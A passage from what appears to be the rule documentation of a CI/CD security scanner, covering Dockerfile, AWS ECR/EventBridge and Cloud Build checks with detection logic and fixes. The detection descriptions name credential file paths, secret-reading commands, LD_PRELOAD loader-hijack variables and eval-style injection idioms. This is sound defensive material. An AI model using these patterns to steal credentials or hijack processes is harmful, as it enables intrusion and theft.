**How this is detected.** Mirrors GHA-017 / GL-017 / BB-013 / ADO-017 / CC-017 / JF-017 (``docker run --privileged`` in CI scripts) but at Dockerfile build time. The risk is subtler: a privileged RUN step doesn't directly elevate the resulting image, but it gives the build host's docker daemon a chance to escape, and any tampered base image can exploit the elevated build.

**Recommendation.** A Dockerfile build step almost never legitimately needs ``--privileged`` or ``--cap-add SYS_ADMIN`` / ``ALL``. If the build genuinely requires elevated capabilities (e.g. compiling a kernel module), do it in a sealed builder image and ``COPY`` the artifact out, don't carry the privileged execution into the runtime image.

**Source:** [`DF-008`](../providers/dockerfile.md#df-008) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-010`: apt-get dist-upgrade / upgrade pulls unknown package versions <span class="pg-sev pg-sev--low">LOW</span> { #detail-df-010 }

**Evidences:** [`PR.PS-02`](#ctrl-pr-ps-02) Software is maintained, replaced, and removed commensurate with risk.

**How this is detected.** Running ``apt-get upgrade`` (or ``dist-upgrade``) inside a Dockerfile is the classic pet-vs-cattle anti-pattern. Two back-to-back builds with the same Dockerfile can produce different images because the upstream archive moved between the two ``RUN`` invocations. ``dist-upgrade`` additionally relaxes dependency resolution. It can install / remove arbitrary packages to satisfy upgrades, so the resulting image's package set isn't even bounded by what the Dockerfile declares.

**Recommendation.** Drop the upgrade step. Build on a recent base image instead (rebuild your image when the base image gets a security patch, pin the base by digest per DF-001 so the rebuild is deterministic). ``apt-get install pkg=<version>`` for specific packages stays reproducible; ``upgrade`` / ``dist-upgrade`` does not.

**Source:** [`DF-010`](../providers/dockerfile.md#df-010) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-011`: Package manager install without cache cleanup in same layer <span class="pg-sev pg-sev--low">LOW</span> { #detail-df-011 }

**Evidences:** [`PR.PS-02`](#ctrl-pr-ps-02) Software is maintained, replaced, and removed commensurate with risk.

**How this is detected.** Each Dockerfile ``RUN`` produces a layer. Installing packages in one layer and cleaning the cache in a later layer leaves the cache files in the lower layer forever, final image size is unchanged and the residual files broaden the attack surface (e.g. apt's signed-by keys, package metadata). The fix is layout, not behavior: do install + cleanup in the same ``RUN``.

**Recommendation.** Combine the install and cleanup into the same ``RUN`` so the cache lands in a single layer that gets discarded together. Idiomatic pattern: ``RUN apt-get update && apt-get install -y <pkgs> && rm -rf /var/lib/apt/lists/*``. Equivalent forms: ``apk add --no-cache <pkgs>``, ``dnf install -y … && dnf clean all``, ``yum install -y … && yum clean all``, ``zypper -n in … && zypper clean -a``.

**Source:** [`DF-011`](../providers/dockerfile.md#df-011) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-012`: RUN invokes sudo <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-012 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** ``sudo`` inside a Dockerfile is almost always a copy-paste from a host README. Its presence usually means one of three things, all of them wrong: (a) the build is silently running as root and the operator misread it, (b) the image carries an unrestricted ``sudoers`` line that a runtime escape can abuse, or (c) the package install chain depends on TTY-aware ``sudo`` behavior that breaks under non-TTY ``docker build``. None of these cases benefit from keeping the directive.

**Recommendation.** Drop ``sudo`` from the ``RUN``. Either the build is already running as root (the default before any ``USER`` directive), in which case ``sudo`` is no-op noise, or the build switched to a non-root ``USER`` and needs root for a specific step, in which case temporarily revert with ``USER root`` for that ``RUN`` and switch back afterward.

**Source:** [`DF-012`](../providers/dockerfile.md#df-012) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-013`: EXPOSE declares sensitive remote-access port <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-df-013 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied, [`PR.IR-01`](#ctrl-pr-ir-01) Networks and environments are protected from unauthorized logical access and usage.

**How this is detected.** ``EXPOSE`` is documentation, not a firewall. It doesn't actually open the port. But ``EXPOSE 22`` is a strong signal the image runs sshd, and any remote-access daemon inside the container blows up the threat model: now you have an extra auth surface, an extra service to keep patched, and a way for a compromised app to phone home from the outside. The container runtime / orchestrator's exec path covers every operational use case sshd traditionally served.

**Recommendation.** Remove the ``EXPOSE`` line for the remote-access port. If the operator legitimately needs to reach the container, exec into it (``docker exec`` / ``kubectl exec``). That path uses the orchestrator's auth and audit, doesn't open a network port, and doesn't ship an extra daemon inside the image. Containers should not run sshd / telnetd / ftpd / rsh-d / vncd / RDP alongside the application.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`DF-013`](../providers/dockerfile.md#df-013) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-014`: WORKDIR set to a system / kernel filesystem path <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-df-014 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** Subsequent directives in the Dockerfile (``COPY src dest``, ``RUN`` writes, ``ADD …``) resolve relative paths against the active ``WORKDIR``. A ``WORKDIR /sys`` followed by ``COPY conf.txt config.txt`` writes into the kernel's sysfs surface, at best a build-time error, at worst a container-escape primitive that lets a compromised step manipulate cgroups, devices, or kernel config.

**Recommendation.** Move ``WORKDIR`` to a dedicated app directory (``/app``, ``/srv/app``, ``/opt/<service>``). System paths like ``/sys``, ``/proc``, ``/dev``, ``/etc``, ``/`` and the ``root`` home are not application directories, pointing the working dir at one means subsequent ``COPY`` / ``RUN`` writes target kernel-exposed namespaces or admin-only configuration.

**Source:** [`DF-014`](../providers/dockerfile.md#df-014) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-015`: RUN grants world-writable permissions (chmod 777 / a+w) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-df-015 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** World-writable directories under ``/`` are an established container-escape vector: any compromised process running as non-root can drop a payload that root-owned daemons later execute. The rule fires on the literal ``777``, ``a+w``, and ``a+rwx`` modes; the more conservative ``775`` and ``ugo+x`` are not flagged.

**Recommendation.** Replace ``chmod 777 <path>`` with the narrowest permissions the workload actually needs. ``chmod 755`` is enough for executables under a read-only root filesystem; ``640`` or ``600`` for files the runtime user reads. ``a+w`` is almost always copy-pasted from a SO answer and almost never the correct fix.

**Known false positives.**

- Test fixtures or scratch builds that intentionally share a directory across multiple non-root users may legitimately use ``777``. Suppress with an ignore-file entry rather than weakening the rule.

**Source:** [`DF-015`](../providers/dockerfile.md#df-015) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-016`: Image lacks OCI provenance labels <span class="pg-sev pg-sev--low">LOW</span> { #detail-df-016 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts.

**How this is detected.** The OCI image-spec annotation set is a small de facto standard maintained by the OCI working group. Only ``image.source`` and ``image.revision`` are checked because they're the two whose absence makes incident response materially harder; ``image.title`` / ``image.description`` are nice-to-have but the rule doesn't fire on those.

**Recommendation.** Add a ``LABEL`` line carrying at least ``org.opencontainers.image.source`` (the URL of the source repo) and ``org.opencontainers.image.revision`` (the commit SHA built into the image). Most registries surface those fields in the UI and on ``manifest inspect``, which closes the source-to-image gap that GHA-006 / SLSA Build-L2 provenance attestation also addresses.

**Known false positives.**

- A multi-stage build's intermediate stages don't need provenance labels, only the final image ships. The rule fires per Dockerfile, not per stage; suppress for files where the final ``FROM`` is intentional throwaway scratch.

**Source:** [`DF-016`](../providers/dockerfile.md#df-016) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-017`: ENV PATH prepends a world-writable directory <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-df-017 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** A writable PATH entry that comes before the system bins lets any process inside the container shadow ``ls``, ``ps``, ``apt-get``, ``cat``, etc. by dropping a binary of the same name into the writable dir. On a multi-tenant image, or any image where an exploit can reach the filesystem, this is a free privilege-escalation vector.

**Recommendation.** Don't put ``/tmp``, ``/var/tmp``, ``/dev/shm``, or any other world-writable path in ``PATH`` ahead of the system binary directories. Drop those entries entirely, or place them at the tail (``ENV PATH=/usr/bin:$PATH:/tmp``) so legitimate binaries always shadow anything dropped into the writable dir at runtime.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`DF-017`](../providers/dockerfile.md#df-017) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-018`: RUN chown rewrites ownership of a system path <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-df-018 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** Recognizes ``chown`` and ``chgrp`` invocations whose first non-flag path argument resolves under a system directory. The non-recursive case is also flagged because a single ``chown user /etc`` is just as harmful, the recursive flag matters for the size of the blast radius, not for whether it's wrong. Application paths under ``/opt``, ``/srv``, ``/var/lib/<app>``, and ``/app`` are not flagged.

**Recommendation.** Don't ``chown`` system directories at build time. If the runtime user needs to own a workload-specific subtree, ``COPY --chown=<user>:<group>`` it into the image at the subtree root, or place the workload under a dedicated directory (e.g. ``/app``, ``/srv/app``) and ``chown`` only that path. Granting the runtime user write access to ``/etc``, ``/usr``, ``/sbin``, or ``/lib`` lets a process exploit later steps to stage a binary the system trusts.

**Source:** [`DF-018`](../providers/dockerfile.md#df-018) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-019`: COPY/ADD source path looks like a credential file <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-df-019 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed.

**How this is detected.** Fires on any ``COPY`` or ``ADD`` whose source basename is a well-known credential filename (``id_rsa``, ``.npmrc``, ``.netrc``, ``.env``, ``terraform.tfvars``, …) or whose path tail matches a canonical credential location (``.aws/credentials``, ``.docker/config.json``, ``.kube/config``). Files with private-key extensions (``.pem``, ``.key``, ``.p12``, ``.pfx``, ``.jks``) are also flagged. Globs are not expanded, the rule reads the literal source token.

**Recommendation.** Don't ``COPY`` credential files into an image. Anything baked into a layer is recoverable by anyone who can pull the image, even if a later step deletes the file. For build-time secrets (npm tokens, registry credentials, SSH deploy keys), use ``RUN --mount=type=secret,id=<name>`` so the value lives only for the duration of the step. For runtime secrets, mount them from the orchestrator (Kubernetes Secret, ECS task role, Vault sidecar) instead.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Empty placeholder files (``.env`` shipped as a template, ``config.json`` carrying only public flags). Suppress with a brief ``.pipelinecheckignore`` rationale and prefer an explicit non-secret name (``.env.example``).

**Source:** [`DF-019`](../providers/dockerfile.md#df-019) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-020`: ARG declares a credential-named build argument <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-df-020 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed.

**How this is detected.** Complements DF-006 (which flags an ENV/ARG with a literal credential-shaped value). This rule fires on the *name* alone, ``ARG NPM_TOKEN``, ``ARG GITHUB_PAT``, ``ARG DB_PASSWORD``, even when no default is set, because BuildKit records the resolved value in the image's history the moment ``--build-arg`` supplies one. Names are matched via the same ``_primitives/secret_shapes`` regex used by the other secret-name rules.

**Recommendation.** Don't pass secrets through ``ARG``. Build arguments are recorded in ``docker history`` whether the value comes from a default or from ``--build-arg`` at build time, so a credential-named ARG leaks the secret to anyone who can pull the image. Use ``RUN --mount=type=secret,id=<name>`` and feed the value with BuildKit's ``--secret`` flag, the secret never lands in a layer or in the build history.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- An ``ARG`` whose name matches the regex but is a non-secret config knob (a counter-example like ``ARG TOKEN_LIMIT``). Rare; rename or suppress the finding with a brief rationale.

**Source:** [`DF-020`](../providers/dockerfile.md#df-020) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-021`: RUN pip install bypasses TLS or uses an HTTP index <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-021 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts, [`PR.DS-02`](#ctrl-pr-ds-02) The confidentiality, integrity, and availability of data-in-transit are protected.

**How this is detected.** Three shapes are detected: ``pip install --trusted-host <host>``, ``pip install -i http://...`` (or ``--index-url http://...``), and ``pip install --extra-index-url http://...``. All three tell pip to accept whatever the upstream returns without certificate verification. The result is a build-time supply-chain MITM surface: anyone able to inject responses on the network path between the build host and the index can ship arbitrary wheels into the image. Complements the generic TLS-bypass primitive (which catches ``pip config set global.trusted-host``) by covering the per-invocation flag form most teams actually reach for.

**Recommendation.** Drop ``--trusted-host`` and switch any ``-i`` / ``--index-url`` / ``--extra-index-url`` to ``https://``. If the internal index has a self-signed certificate, install the CA into the image's truststore (``ca-certificates`` + ``update-ca-certificates``) instead of telling pip to skip verification. ``--trusted-host`` whitelists the host across the entire pip invocation, so a single ``RUN`` line ends up fetching every dependency over an unverified connection.

**Known false positives.**

- An internal index served over plain HTTP on a private network (no internet path) is the typical justification for the flag. Fix the index (terminate TLS at a reverse proxy, or install the internal CA into the image) rather than leaving the bypass in the Dockerfile.

**Source:** [`DF-021`](../providers/dockerfile.md#df-021) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-022`: RUN uses npm install instead of npm ci <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-df-022 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts.

**How this is detected.** Mirrors GHA-022 / GL-022 / JF-021 (CI-side lockfile integrity) at the image-build layer. The build-time consequence is the same shape: dependency resolution happens against the live registry rather than against the committed lockfile, so the image ends up carrying whatever the registry served at build time rather than the set the team audited. The rule fires on bare ``npm install`` / ``npm i`` as well as on flagged variants (``--no-package-lock``, ``--force``, ``--legacy-peer-deps``) which all defeat the lockfile contract one way or another.

**Recommendation.** Switch to ``npm ci`` (or ``yarn install --frozen-lockfile`` / ``pnpm install --frozen-lockfile`` for those toolchains). ``npm ci`` requires a ``package-lock.json`` and fails the build if it disagrees with ``package.json``; it never rewrites the lockfile and never installs packages outside the locked set. ``npm install`` does the opposite: it resolves ranges in ``package.json`` at build time and happily mutates the lockfile to fit the resolution, so a transient dependency the team never reviewed can land in the image.

**Known false positives.**

- Multi-stage build whose runtime image copies in a pre-computed ``node_modules`` and never installs at build time is unaffected, the rule only fires on directives that actually invoke ``npm install``.
- ``npm install --production`` is still flagged: it ignores ``devDependencies`` but still re-resolves and mutates the lockfile. Use ``npm ci --omit=dev`` instead.

**Source:** [`DF-022`](../providers/dockerfile.md#df-022) in the [Dockerfile provider](../providers/dockerfile.md).

#### `DF-023`: ENV sets a dynamic-loader hijack variable <span class="pg-sev pg-sev--high">HIGH</span> { #detail-df-023 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** ``LD_PRELOAD``, ``LD_LIBRARY_PATH``, and ``LD_AUDIT`` are consulted by ``ld-linux`` for every dynamically-linked binary the image runs. A baked-in value gives an attacker who can drop a file inside the container (via a writable mount, a vulnerable upload handler, a build-stage hold-over) the ability to hook ``libc`` calls in privileged processes, intercept TLS, or shim ``execve`` to reroute commands. ``LD_LIBRARY_PATH`` pointing at a writable directory is the milder shape of the same risk: a planted ``libc.so.6`` shadows the system lib for every later binary.

**Recommendation.** Don't bake ``LD_PRELOAD`` / ``LD_LIBRARY_PATH`` / ``LD_AUDIT`` into the image. If a specific binary needs a non-standard library lookup, set the env var in the binary's own ``ENTRYPOINT`` wrapper so the override is scoped to that process, or, better, configure ``/etc/ld.so.conf.d/`` and rerun ``ldconfig`` at build time. A baked-in ``LD_*`` value applies to every process the image launches, including any shell an attacker reaches after an exploit.

**Known false positives.**

- Sanitizer-instrumented images (``LD_PRELOAD=libasan.so``) and APM agent hooks (``LD_PRELOAD=/opt/dynatrace/...``) are legitimate. Suppress the finding for the specific Dockerfile with a one-line rationale; the rule deliberately catches the pattern because the same shape is the standard loader-hijack escalation primitive.

**Source:** [`DF-023`](../providers/dockerfile.md#df-023) in the [Dockerfile provider](../providers/dockerfile.md).

#### `EB-001`: No EventBridge rule for CodePipeline failure notifications <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-eb-001 }

**Evidences:** [`DE.CM-09`](#ctrl-de-cm-09) Computing hardware and software, runtime environments, and their data are monitored.

**How this is detected.** Pipeline failure events are emitted to EventBridge automatically; the missing piece is a rule that pipes them to somewhere a human reads (SNS, Slack, PagerDuty). Without it, failures only surface via the CodePipeline console, which no one watches.

**Recommendation.** Create an EventBridge rule matching ``detail-type: 'CodePipeline Pipeline Execution State Change'`` and ``state: FAILED``, and point it at an SNS topic or chat webhook. Without it, pipeline failures during an incident (a compromise triggering rollback, for example) go unnoticed.

**Source:** [`EB-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `EB-002`: EventBridge rule has a wildcard target ARN <span class="pg-sev pg-sev--high">HIGH</span> { #detail-eb-002 }

**Evidences:** [`DE.CM-06`](#ctrl-de-cm-06) External service provider activities and services are monitored.

**How this is detected.** Wildcard target ARNs (e.g. ``arn:aws:lambda:us-east-1:123456789012:function:*``) match every resource that fits the prefix. This is rarely intentional, usually a copy-paste from a more permissive resource ARN, and means the rule fans out to a much larger set of consumers than the author meant.

**Recommendation.** Replace wildcard target ARNs with specific resource ARNs. EventBridge targets with ``*`` route events to any resource that matches the prefix, frequently triggering unintended Lambda invocations or SNS sends.

**Source:** [`EB-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `ECR-001`: Image scanning on push not enabled <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ecr-001 }

**Evidences:** [`PR.PS-02`](#ctrl-pr-ps-02) Software is maintained, replaced, and removed commensurate with risk.

**How this is detected.** scan-on-push runs a CVE check against the image's OS package layers at the moment it lands in ECR. Without it, an image with a known CVE deploys silently. The ECR basic scanner is free; ECR-007 covers the Inspector v2 enhanced scanner that adds language-ecosystem CVEs (npm, pip, gem).

**Recommendation.** Enable imageScanningConfiguration.scanOnPush on the repository. Consider also enabling Amazon Inspector continuous scanning for ongoing CVE detection against images already in the registry.

**Source:** [`ECR-001`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `ECR-002`: Image tags are mutable <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ecr-002 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts, [`PR.PS-02`](#ctrl-pr-ps-02) Software is maintained, replaced, and removed commensurate with risk.

**How this is detected.** Mutable tags mean ``:latest``, ``:v1.0``, and ``:stable`` can be re-pushed silently, the same tag points to different image content over time. Pinning by digest (``sha256:...``) in deployment manifests is the only durable reference; IMMUTABLE on the repo enforces the property registry-side so a forgotten digest reference doesn't drift.

**Recommendation.** Set imageTagMutability=IMMUTABLE on the repository. Reference images by digest (sha256:...) in deployment manifests for strongest immutability guarantees.

**Source:** [`ECR-002`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `ECR-003`: Repository policy allows public access <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-ecr-003 }

**Evidences:** [`PR.IR-01`](#ctrl-pr-ir-01) Networks and environments are protected from unauthorized logical access and usage.

**How this is detected.** A wildcard-principal repo policy means anyone on the internet can pull images. Sometimes intentional (a publicly-distributed base image), but should be a deliberate exposure, typically via the ECR Public registry rather than a private repo with a public policy. The default for build-output images should never be public.

**Recommendation.** Remove wildcard principals from the repository policy. Grant access only to specific AWS account IDs or IAM principals that require it.

**Source:** [`ECR-003`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `ECR-005`: Repository encrypted with AES256 rather than KMS CMK <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ecr-005 }

**Evidences:** [`PR.DS-01`](#ctrl-pr-ds-01) The confidentiality, integrity, and availability of data-at-rest are protected.

**How this is detected.** Same shape as CP-002 / CWL-002 / CCM-002: AES256 (the AWS-managed default) gives confidentiality at rest but no key-policy or CloudTrail Decrypt-event story. Container images are arguably sensitive intellectual property, the same key-policy + audit shape as build outputs in S3 is warranted.

**Recommendation.** Set encryptionType=KMS with a customer-managed key ARN.

**Source:** [`ECR-005`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `ECR-006`: ECR pull-through cache rule uses an untrusted upstream <span class="pg-sev pg-sev--high">HIGH</span> { #detail-ecr-006 }

**Evidences:** [`GV.SC-04`](#ctrl-gv-sc-04) Suppliers are known and prioritized by criticality, [`GV.SC-07`](#ctrl-gv-sc-07) Risks posed by suppliers, their products and services, are understood, recorded, prioritized, assessed, responded to, and monitored.

**How this is detected.** AWS supports pull-through cache for ECR Public, Quay, K8s, GitHub Container Registry, GitLab, and Docker Hub. A rule pointing at ``registry-1.docker.io`` without an authenticated credential silently caches whatever the public namespace resolves to.

**Recommendation.** Scope pull-through cache rules to AWS-trusted registries (ECR Public, Quay.io with authentication, or a vetted private registry). Avoid wildcard or unauthenticated upstreams, a malicious image there gets cached into your account registry on first pull.

**Source:** [`ECR-006`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `ECR-007`: Inspector v2 enhanced scanning disabled for ECR <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-ecr-007 }

**Evidences:** [`PR.PS-02`](#ctrl-pr-ps-02) Software is maintained, replaced, and removed commensurate with risk.

**How this is detected.** ECR-001's basic on-push scan covers OS-level packages, apt / yum / apk lineage. Most production CVE risk is in language ecosystems (npm, pip, gem, mvn) which the basic scanner ignores. Inspector v2 enhanced scanning closes that gap and runs continuously, so a CVE published two weeks after a build still surfaces against the deployed image.

**Recommendation.** Enable Amazon Inspector v2 for the ``ECR`` scan type on this account. Basic ECR scanning on-push only covers OS packages; Inspector v2 enhanced scanning adds language-ecosystem CVEs and runs continuously as new vulnerabilities are published.

**Source:** [`ECR-007`](../providers/aws.md) in the [AWS provider](../providers/aws.md).

#### `GCB-001`: Cloud Build step image not pinned by digest <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gcb-001 }

**Evidences:** [`GV.SC-05`](#ctrl-gv-sc-05) Requirements to address cybersecurity risks in supply chains are established, prioritized, and integrated into contracts.

**How this is detected.** Bare references (``gcr.io/cloud-builders/docker``) are treated as ``:latest`` by Cloud Build. Tag-only references (``:20``, ``:latest``) count as unpinned. Only ``@sha256:…`` suffixes pass.

**Recommendation.** Pin every ``steps[].name`` image to an ``@sha256:<digest>`` suffix. ``gcr.io/cloud-builders/docker:latest`` is mutable; Google publishes new builder images frequently and the next build would pull whatever is current. Resolve the digest with ``gcloud artifacts docker images describe <ref> --format='value(image_summary.digest)'`` and pin it.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GCB-001`](../providers/cloudbuild.md#gcb-001) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GCB-002`: Cloud Build uses the default service account <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gcb-002 }

**Evidences:** [`PR.AA-03`](#ctrl-pr-aa-03) Users, services, and hardware are authenticated.

**How this is detected.** The default Cloud Build service account historically held ``roles/cloudbuild.builds.builder`` plus project-level editor in many organisations. Even under the GCP April-2024 default-identity change, the default SA is still broader than what a single pipeline needs. Explicit ``serviceAccount:`` is required to pass.

**Recommendation.** Create a dedicated service account for the build, grant it only the roles the pipeline actually needs (``roles/artifactregistry.writer``, ``roles/storage.objectCreator`` for artifact upload, etc.), and set ``serviceAccount: projects/<PROJECT>/serviceAccounts/<NAME>@...``. Leaving it unset falls back to the default Cloud Build SA, which accumulates roles over a project's lifetime and is routinely granted ``roles/editor``.

**Source:** [`GCB-002`](../providers/cloudbuild.md#gcb-002) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GCB-003`: Secret Manager value referenced in step args <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gcb-003 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed.

**How this is detected.** Detection patterns: literal ``projects/<n>/secrets/<name>/versions/...`` URIs, ``gcloud secrets versions access`` shell invocations, and ``$(gcloud secrets …)`` command substitutions in step args or entrypoint.

**Recommendation.** Map the secret under ``availableSecrets.secretManager[]`` with an ``env:`` alias, then reference it from each step via ``secretEnv: [ALIAS]``. Avoid inline ``gcloud secrets versions access`` in ``args``, the resolved plaintext lands in build logs.

**Known false positives.**

- Steps whose sole purpose is to *grant* a service account access to a secret (``gcloud secrets add-iam-policy-binding``) reference the resource URI without exposing the value. The literal-URI regex doesn't distinguish read from administrative operations. Suppress those specific steps via ``--ignore-file`` once you've confirmed the gcloud subcommand is administrative.

**Source:** [`GCB-003`](../providers/cloudbuild.md#gcb-003) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GCB-004`: dynamicSubstitutions on with user substitutions in step args <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gcb-004 }

**Evidences:** [`PR.PS-05`](#ctrl-pr-ps-05) Installation and execution of unauthorized software are prevented.

**How this is detected.** The ``_``-prefix is Cloud Build's naming convention for user substitutions; they are editable via build trigger UI, ``gcloud builds submit --substitutions``, and the REST API. Built-in substitutions (``$PROJECT_ID``, ``$COMMIT_SHA``, ``$BUILD_ID``) are derived from the trigger event and are *not* treated as user-controlled by this rule.

**Recommendation.** Either disable ``options.dynamicSubstitutions`` (it defaults to false) or move user substitutions (``$_FOO``) out of step ``args``, pass them through ``env:`` and reference them inside a shell script the builder runs. Dynamic substitution re-evaluates bash syntax after variable expansion, giving trigger-config editors a script-injection channel.

**Known false positives.**

- Pipelines that enable ``dynamicSubstitutions`` solely to use bash parameter expansion on *built-in* substitutions (``${PROJECT_ID/-/_}``) still flag if any step also references a ``$_USER_VAR``, even when the user sub lands in a context that can't reach a shell. The rule has no AST-level awareness of which substitution is consumed by which shell context. Suppress per-step via ``--ignore-file`` after verifying the user sub never feeds bash re-evaluation.

**Source:** [`GCB-004`](../providers/cloudbuild.md#gcb-004) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GCB-005`: Build timeout unset or excessive <span class="pg-sev pg-sev--low">LOW</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gcb-005 }

**Evidences:** [`PR.PS-01`](#ctrl-pr-ps-01) Configuration management practices are established and applied.

**How this is detected.** Cloud Build's default 10-minute timeout applies silently when ``timeout:`` is absent. Accepted format is ``<N>s`` (seconds); ``<N>m``/``<N>h`` forms are a gcloud convenience and are treated as malformed by the API.

**Recommendation.** Declare an explicit ``timeout:`` at the top of ``cloudbuild.yaml`` bounded to the build's realistic worst case (e.g. ``1800s`` for most container builds). Explicit bounds shorten the window a compromised build can spend on a shared worker and flag regressions when a legitimate step slows down.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`GCB-005`](../providers/cloudbuild.md#gcb-005) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GCB-006`: Dangerous shell idiom (eval, sh -c variable, backtick exec) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gcb-006 }

**Evidences:** [`PR.PS-05`](#ctrl-pr-ps-05) Installation and execution of unauthorized software are prevented.

**How this is detected.** Complements GCB-004 (dynamicSubstitutions + user substitution in args). GCB-006 fires on intrinsically risky shell idioms, ``eval``, ``sh -c "$X"``, backtick exec, regardless of whether the substitution source is currently trusted.

**Recommendation.** Replace ``eval "$VAR"`` / ``sh -c "$VAR"`` / backtick exec with direct command invocation. Validate or allow-list any value that must feed a dynamic command at the boundary. In Cloud Build these idioms typically appear in ``args: [-c, ...]`` entries under a bash entrypoint.

**Known false positives.**

- ``eval "$(ssh-agent -s)"`` and similar ``eval "$(<literal-tool>)"`` bootstrap idioms are intentionally NOT flagged, the substituted command is literal, only its output is eval'd.

**Source:** [`GCB-006`](../providers/cloudbuild.md#gcb-006) in the [Cloud Build provider](../providers/cloudbuild.md).

#### `GCB-007`: availableSecrets references ``versions/latest`` <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gcb-007 }

**Evidences:** [`PR.AA-01`](#ctrl-pr-aa-01) Identities and credentials for authorized users, services, and hardware are managed.

**How this is detected.** ``versions/latest`` is documented as a rolling alias. A build run on Monday and a re-run on Tuesday can consume different secret bodies without any change to ``cloudbuild.yaml``, breaking the reproducibility invariant that pinning protects.

